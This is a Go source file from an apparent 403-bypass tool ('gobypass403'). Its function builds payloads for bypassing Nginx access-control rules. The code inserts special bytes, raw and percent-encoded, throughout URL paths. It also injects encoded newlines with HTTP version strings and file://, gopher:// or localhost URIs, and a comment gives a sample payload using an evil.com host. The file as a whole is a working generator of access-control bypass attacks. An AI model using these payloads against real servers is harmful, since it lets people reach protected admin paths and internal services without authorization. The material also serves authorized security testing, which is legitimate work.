package payload

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

/*
GenerateNginxACLsBypassPayloads generates payloads aimed at bypassing Nginx ACLs
and similar proxy/server misconfigurations.

Techniques include:
- Appending/prepending/inserting special characters (raw and URL-encoded).
- Using URL-encoded newlines (%0A) to potentially split processing.
- Injecting HTTP version strings after newlines.
- Injecting full alternative URIs (scheme://host/path) after newlines.

Bypass Characters From Multiple Frameworks:
Flask: 0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B
Spring Boot: 0x09, ";"
Node.js: 0xA0, 0x09, 0x0C
Special: %0A (newline) for advanced techniques

Injection Techniques:
Append to end: /admin → /admin<char>
After trailing slash: /admin → /admin/<char>
After leading slash: /admin → /<char>admin ← This is NOT your Google discovery!
After each segment: /a/b → /a<char>/b
Before each segment: /a/b → /a/<char>b
After first char: /admin → /a<char>dmin
Complex HTTP version injection: /admin%0AHTTP/1.1%0Ahttp://evil.com/admin

If any generated path segment (before appending the original query) contains
literal '?' or '#' characters, additional payloads are generated where these
special characters are percent-encoded (%3F and %23) to ensure the original
query string can be appended unambiguously.
*/
func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	basePath := parsedURL.Path // Path might contain raw '?' or '#'

	query := ""
	// Use Query as it preserves encoding better for this purpose if needed later
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// --- Define bypass characters ---
	flaskBypassBytes := []byte{0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B}
	springBootBypassBytes := []byte{0x09}
	springBootStrings := []string{";"}
	nodejsBypassBytes := []byte{0xA0, 0x09, 0x0C}

	rawBypassChars := make([]string, 0)
	encodedBypassChars := make([]string, 0)
	charMap := make(map[string]bool) // Track uniqueness

	processBytes := func(bytes []byte) {
		for _, b := range bytes {
			rawChar := string([]byte{b}) // Keep raw byte representation
			if !charMap[rawChar] {
				// Only add raw if not problematic for URI construction later (like newline)
				if b != '\n' {
					rawBypassChars = append(rawBypassChars, rawChar)
					charMap[rawChar] = true
				} else if !charMap["\n_placeholder"] { // Use placeholder to track newline addition
					charMap["\n_placeholder"] = true // Mark newline as seen, but don't add raw '\n' to list
				}
			}
			encodedChar := fmt.Sprintf("%%%02X", b)
			// Avoid duplicate encoded versions if byte value is same (e.g., 0x09 from multiple lists)
			if !charMap[encodedChar] {
				encodedBypassChars = append(encodedBypassChars, encodedChar)
				charMap[encodedChar] = true
			}
		}
	}

	processBytes(flaskBypassBytes)
	processBytes(springBootBypassBytes)
	processBytes(nodejsBypassBytes)

	for _, s := range springBootStrings {
		if !charMap[s] {
			rawBypassChars = append(rawBypassChars, s)
			charMap[s] = true
		}
		// Add encoded version if different and not already added
		encodedS := url.QueryEscape(s)
		if encodedS != s && !charMap[encodedS] {
			encodedBypassChars = append(encodedBypassChars, encodedS)
			charMap[encodedS] = true
		}
	}

	// Handle newline (%0A) specifically for encoded list
	encodedNewline := "%0A"
	if !charMap[encodedNewline] {
		encodedBypassChars = append(encodedBypassChars, encodedNewline)
		charMap[encodedNewline] = true
	}
	// Ensure we track raw newline was considered, even if not added to rawBypassChars
	if !charMap["\n_placeholder"] {
		charMap["\n_placeholder"] = true
	}

	// Split the path into segments
	// Handle root path correctly: "/" -> [""]
	// Handle "/a/b" -> ["a", "b"]
	var pathSegments []string
	trimmedPath := strings.TrimPrefix(basePath, "/")
	if basePath == "/" {
		pathSegments = []string{""} // Represent root segment explicitly? Or handle differently?
		// Let's treat "/" as having one segment "" for insertion logic? No, Split returns [""]
		// If basePath is just "/", Split("", "/") gives [""].
		// If basePath is "/a/b", Split("a/b", "/") gives ["a", "b"].
		// If basePath is "/a/", Split("a/", "/") gives ["a", ""].
		pathSegments = strings.Split(trimmedPath, "/")
	} else if basePath == "" {
		// Treat empty path as root for consistency? No, path is likely intended to be empty.
		pathSegments = []string{}
	} else {
		pathSegments = strings.Split(trimmedPath, "/")
	}

	// --- Helper function to add jobs ---
	// Takes the path part (before query) and optional headers
	addJob := func(pathPart string, headers ...Headers) {
		// 1. Create the standard job
		job := baseJob                // Copy base template
		job.RawURI = pathPart + query // Append original query
		if len(headers) > 0 {
			job.Headers = headers
		}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)

		// 2. Check if pathPart contains special chars and add encoded variant if needed
		if strings.ContainsAny(pathPart, "?#") {
			encodedPathPart := encodeQueryAndFragmentChars(pathPart)
			// Ensure encoding actually changed something before adding
			if encodedPathPart != pathPart {
				encodedJob := baseJob                       // Copy base template again
				encodedJob.RawURI = encodedPathPart + query // Use encoded path + query
				if len(headers) > 0 {
					encodedJob.Headers = headers
				}
				// Generate a distinct token if desired, or reuse base logic
				encodedJob.PayloadToken = GeneratePayloadToken(encodedJob)
				allJobs = append(allJobs, encodedJob)
			}
		}
	}

	// --- Generate Payloads ---

	// 1. Append characters to the end of the path
	for _, char := range rawBypassChars {
		addJob(basePath + char) // Pass path part without query
	}
	for _, encoded := range encodedBypassChars {
		addJob(basePath + encoded) // Pass path part without query
	}

	// 2. Try after a trailing slash
	if !strings.HasSuffix(basePath, "/") {
		pathWithSlash := basePath + "/"
		for _, char := range rawBypassChars {
			addJob(pathWithSlash + char)
		}
		for _, encoded := range encodedBypassChars {
			addJob(pathWithSlash + encoded)
		}
	} else {
		// If path already ends with "/", just append after it (avoid double slash from pathWithSlash)
		for _, char := range rawBypassChars {
			addJob(basePath + char) // Same as case 1, effectively deduplicated by map later if basePath was "/"
		}
		for _, encoded := range encodedBypassChars {
			addJob(basePath + encoded) // Same as case 1
		}
	}

	// 3. Insert characters at the beginning of the path (after leading slash)
	// Need to handle root path "/" carefully
	leadingSlash := "/"
	pathWithoutLeadingSlash := strings.TrimPrefix(basePath, "/")
	if basePath == "/" {
		pathWithoutLeadingSlash = "" // For root, inserting at beginning means /<char>
	}

	for _, char := range rawBypassChars {
		addJob(leadingSlash + char + pathWithoutLeadingSlash)
	}
	for _, encoded := range encodedBypassChars {
		addJob(leadingSlash + encoded + pathWithoutLeadingSlash)
	}

	// 3b. Insert characters BEFORE the leading slash (malformed but may bypass normalization)
	// Generates patterns like <char>/admin/users (this found the Google Cloud LB vulnerability)
	for _, char := range rawBypassChars {
		addJob(char + basePath)
	}
	for _, encoded := range encodedBypassChars {
		addJob(encoded + basePath)
	}

	// 4a. Insert characters immediately AFTER each path segment (before the next '/')
	// Generates patterns like /segment1<char>/segment2...
	// Check if pathSegments is usable (not empty path, not just root "/")
	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
		for i := 0; i < len(pathSegments); i++ {
			// Construct prefix including the current segment
			prefixSegments := pathSegments[:i+1]
			prefix := "/" + strings.Join(prefixSegments, "/") // e.g., "/seg1" or "/seg1/seg2"

			// Construct suffix starting from the next segment
			suffix := ""
			if i+1 < len(pathSegments) {
				suffixSegments := pathSegments[i+1:]
				suffix = "/" + strings.Join(suffixSegments, "/") // e.g., "/seg2/seg3" or "/seg3"
			}

			// Insert characters between prefix and suffix
			for _, char := range rawBypassChars {
				addJob(prefix + char + suffix)
			}
			for _, encoded := range encodedBypassChars {
				addJob(prefix + encoded + suffix)
			}
		}
	}

	// 4b. Insert characters immediately BEFORE each path segment (after the preceding '/')
	// Generates patterns like /segment1/<char>segment2...
	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
		for i := 0; i < len(pathSegments); i++ { // Iterate through each segment
			// Construct prefix up to the segment *before* the current one
			prefix := "/"
			if i > 0 {
				prefixSegments := pathSegments[:i]
				prefix = "/" + strings.Join(prefixSegments, "/") + "/" // e.g., "/" or "/seg1/"
			}

			// Get the current segment and the rest of the path
			currentSegment := pathSegments[i]
			restOfPath := ""
			if i+1 < len(pathSegments) {
				restOfPath = "/" + strings.Join(pathSegments[i+1:], "/")
			}

			// Insert character before the current segment
			for _, char := range rawBypassChars {
				addJob(prefix + char + currentSegment + restOfPath)
			}
			for _, encoded := range encodedBypassChars {
				addJob(prefix + encoded + currentSegment + restOfPath)
			}
		}
	}

	// 5. Insert characters after the first character of each path segment
	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
		for i, segment := range pathSegments {
			if len(segment) >= 1 { // Need at least one character to insert after
				// Create path prefix (everything before current segment)
				prefix := "/"
				if i > 0 {
					prefix = "/" + strings.Join(pathSegments[:i], "/") + "/"
				}

				// Create path suffix (everything after current segment)
				suffix := ""
				if i+1 < len(pathSegments) {
					suffix = "/" + strings.Join(pathSegments[i+1:], "/")
				}

				// Insert characters after first character of segment
				firstChar := segment[0:1]
				restOfSegment := ""
				if len(segment) > 1 {
					restOfSegment = segment[1:]
				}

				for _, char := range rawBypassChars {
					modifiedPath := prefix + firstChar + char + restOfSegment + suffix
					addJob(modifiedPath)
				}
				for _, encoded := range encodedBypassChars {
					modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix
					addJob(modifiedPath)
				}
			}
		}
	}

	// --- HTTP version and complex bypasses ---
	httpVersions := []string{"HTTP/1.1", "HTTP/1.0", "HTTP/2.0", "HTTP/0.9"}
	schemes := []string{"http://", "https://", "file://", "gopher://"} // Common schemes
	alternativeHosts := []string{"localhost", "127.0.0.1"}             // Common alternative hosts

	// Add port variants if available
	if parsedURL.Port != "" {
		alternativeHosts = append(alternativeHosts, "localhost:"+parsedURL.Port, "127.0.0.1:"+parsedURL.Port)
	} else { // Add common default ports otherwise
		alternativeHosts = append(alternativeHosts, "localhost:80", "localhost:443", "127.0.0.1:80", "127.0.0.1:443")
	}
	// Also include the original host in the list for some variations
	alternativeHosts = append(alternativeHosts, parsedURL.Host)

	// 6. Generate whitespace+HTTP version payloads (%0A only)
	for _, httpVersion := range httpVersions {
		// Append to end
		addJob(basePath + encodedNewline + httpVersion)

		// Insert at path segment positions
		if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
			for i := 0; i <= len(pathSegments); i++ { // Iterate one past last segment for appending
				prefix := "/" + strings.Join(pathSegments[:i], "/")
				// Ensure trailing slash if not the very beginning
				if i > 0 && !strings.HasSuffix(prefix, "/") {
					prefix += "/"
				} else if i == 0 {
					prefix = "/" // Start with slash if inserting at beginning
				}

				suffix := ""
				if i < len(pathSegments) {
					suffix = strings.Join(pathSegments[i:], "/")
				}

				// Insert newline + version between prefix and suffix
				addJob(strings.TrimSuffix(prefix, "/") + encodedNewline + httpVersion + "/" + suffix)
			}
		}
	}

	// 7. Complex bypass patterns with host routing (%0A only)
	for _, httpVersion := range httpVersions {
		for _, scheme := range schemes {
			for _, altHost := range alternativeHosts {
				// Construct the core injected part
				injectionPart := encodedNewline + httpVersion + encodedNewline + scheme + altHost

				// a) Append injection + original path to the end of the base path
				pathVariantA := basePath + injectionPart + basePath
				addJob(pathVariantA)
				addJob(pathVariantA, Headers{Header: "Host", Value: parsedURL.Host}) // With explicit Host

				// b) Insert injection + original path at segment boundaries
				if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
					for i := 0; i <= len(pathSegments); i++ {
						prefix := "/" + strings.Join(pathSegments[:i], "/")
						if i > 0 && !strings.HasSuffix(prefix, "/") {
							prefix += "/"
						} else if i == 0 {
							prefix = "/"
						}

						suffix := ""
						if i < len(pathSegments) {
							suffix = strings.Join(pathSegments[i:], "/")
						}

						// Insert injection + original basePath between prefix and suffix
						pathVariantB := strings.TrimSuffix(prefix, "/") + injectionPart + basePath + "/" + suffix
						addJob(pathVariantB)
						addJob(pathVariantB, Headers{Header: "Host", Value: parsedURL.Host}) // With explicit Host
					}
				}
			}
		}
	}

	// Final log message (unchanged as requested)
	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)

	// Deduplicate payloads based on RawURI to ensure unique payloads
	uniqueJobs := make(map[string]BypassPayload)
	for _, job := range allJobs {
		uniqueJobs[job.RawURI] = job
	}

	// Convert back to slice
	dedupedJobs := make([]BypassPayload, 0, len(uniqueJobs))
	for _, job := range uniqueJobs {
		dedupedJobs = append(dedupedJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("After deduplication: %d unique Nginx bypass payloads for %s\n", len(dedupedJobs), targetURL)
	return dedupedJobs
}
